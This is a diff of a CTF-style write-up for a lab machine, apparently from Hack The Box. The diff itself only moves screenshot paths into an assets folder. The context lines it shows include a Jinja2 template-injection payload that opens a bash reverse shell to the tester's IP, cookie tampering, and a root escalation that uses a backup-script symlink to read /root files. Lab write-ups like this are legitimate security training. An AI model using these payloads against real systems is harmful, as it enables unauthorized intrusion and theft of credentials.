@@ -1,6 +1,6 @@
 
 
-![](2022-06-30-08-52-35.png)
+![](assets/2022-06-30-08-52-35.png)
 
 - #Author: José Luis Íñigo
 - #Nickname: Riskoo
@@ -14,7 +14,7 @@ iPmachine --> 10.10.11.134
 Ip --> 10.10.14.9
 
 ## Ping to machine
-![](2022-06-30-08-54-44.png)
+![](assets/2022-06-30-08-54-44.png)
 
 We are conected
 
@@ -68,7 +68,7 @@ i need know more about werkzeug , whatweb show its httpserver in html5 with pyth
 >Werkzeug is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries.
 
 Explore 
-![](2022-06-30-09-04-15.png)
+![](assets/2022-06-30-09-04-15.png)
 
 nothing in the web code.
 
@@ -115,7 +115,7 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 302      GET        4l       24w      208c http://10.10.11.134:5000/order => http://10.10.11.134:5000/
 200      GET      234l      454w     4288c http://10.10.11.134:5000/track
 ```
-![](2022-06-30-09-14-00.png)
+![](assets/2022-06-30-09-14-00.png)
 
 In the code 
 ```js
@@ -386,7 +386,7 @@ Awscli es para crear servidor de aws . Como vimos en las evidencias básicamente
 
 [Github Awascli Forked](https://github.com/joseluisinigo/aws-cli)
 
-![](2022-06-30-11-57-50.png)
+![](assets/2022-06-30-11-57-50.png)
 
 En las evidencias vimos
 ```bash
@@ -505,22 +505,22 @@ Type "help", "copyright", "credits" or "license" for more information.
 ```
 vimos lo de admin como nombre aquí:
 
-![](2022-06-30-12-39-49.png)
+![](assets/2022-06-30-12-39-49.png)
 
 Ahora vamos a ir a burpsuite a poner el auth a ver que pasa... ¿Por qué auth? 
 
-![](2022-06-30-12-41-00.png)
+![](assets/2022-06-30-12-41-00.png)
 
 ## modificar una cookie con los valores que necesitamos
 
 En firefox
 1. vamos a firefox cambiamos las cookies como aparece en la imagen y tener en cuenta que la url es /home
 
-![](2022-06-30-12-56-34.png)
+![](assets/2022-06-30-12-56-34.png)
 
 2. en chrome
 
-![](2022-06-30-13-23-28.png)
+![](assets/2022-06-30-13-23-28.png)
 
 3. En burpsuite habría que mandar en la petición de esta forma
 ```bash
@@ -542,7 +542,7 @@ Como hemos visto se trata de python por detrás por lo cual vamos a buscar paylo
 
 Además he visto que puedo cambiar los valores por cuentas y aunque algunas dan problemas de servidor , otras me lo hacen
 
-![](2022-06-30-18-55-46.png)
+![](assets/2022-06-30-18-55-46.png)
 
 Estupendo parece que es vulnerable a jinja2 para python, voy a buscar payloads y a ir probando algunos desde repeater de burpsuite a ver que conseguimos. Lo ideal es conseguir una revert shell por lo que tendremos que ponernos en escucha, pero bueno, no adelantemos acontecimientos.
 
@@ -560,7 +560,7 @@ These payloads are context-free, and do not require anything, except being in a 
 
 Pues realmente una vez localizado los payloads no he tenido que probar mucho
 
-![](2022-06-30-19-16-13.png)
+![](assets/2022-06-30-19-16-13.png)
 
 Voy a mandar poniendo la revertshell
 
@@ -575,7 +575,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1
 
 costume={{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"').read() }}&q=1&addr=1
 ```
-![](2022-06-30-19-29-16.png)
+![](assets/2022-06-30-19-29-16.png)
 
 Entiendo que como tiene parámetros con &... debo de convertirlos, sino probaré luego con base64 etc diferentes modos.
 %26 : &
@@ -586,7 +586,7 @@ Por lo que quedará
 costume={{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.14.9/443 0>%261"').read() }}&q=1&addr=1
 ```
 
-![](2022-06-30-19-29-57.png)
+![](assets/2022-06-30-19-29-57.png)
 
 ## Ahora que tenemos la bash creo, voy a arreglarla
 
@@ -619,7 +619,7 @@ stty rows 61 columns 236
 
 ```
 
-![](2022-06-30-19-36-39.png)
+![](assets/2022-06-30-19-36-39.png)
 
 Ya tenemos la flag del usuario, ahora vamos a escalar privilegios.
 
@@ -671,10 +671,10 @@ En var/backups aparecen muchas copias de seguridad... antes de descomprimir nada
 
 He encontrado una carpeta backups que pertenece a root pero que tiene permisos de escritura, además me ha pasado algo curioso y es que he creado un archivo , me lo ha borrado y luego ha mostrado un .tar y un checksum y también me lo ha borrado luego
 
-![](2022-06-30-20-30-08.png)
+![](assets/2022-06-30-20-30-08.png)
 
 He cogido y he ejecutado varias veces ls hasta que me lo ha borrado y vuelto a salir
-![](2022-06-30-20-31-34.png)
+![](assets/2022-06-30-20-31-34.png)
 
 
 Interesante: Entiendo que está cogiendo y creando una copia de seguridad de /opt/backups y luego la va pasando a /var/backups de todas formas me gustaría ver los procesos que hace. Podemos usar pspy32 para ello. Intento dentro de la máquina bajármelo con wget pero no me deja conectar con github. Así que lo hago desde mi pc
@@ -722,7 +722,7 @@ chmod +x pspy64
 
 En los procesos vistos usando ./pspy64 -pf -i 1000   localizo un script de backup que tiene que hacer lo extraño que hemos visto ahora de eliminar
 
-![](2022-06-30-21-03-44.png)
+![](assets/2022-06-30-21-03-44.png)
 
 ```bash
 tom@epsilon:~$ cat /usr/bin/backup.sh 
@@ -763,6 +763,6 @@ total 80412
 ```
 Copiamos en home el del tamaño diferente, lo descomprimos y vemos que ya checksum no es un archivo sino una carpeta (realmente un enlace sibólico a /root)
 
-![](2022-06-30-21-51-18.png)
+![](assets/2022-06-30-21-51-18.png)
 
 Ya tendríamos el root.txt e incluso el id_rsa para poder conectarnos
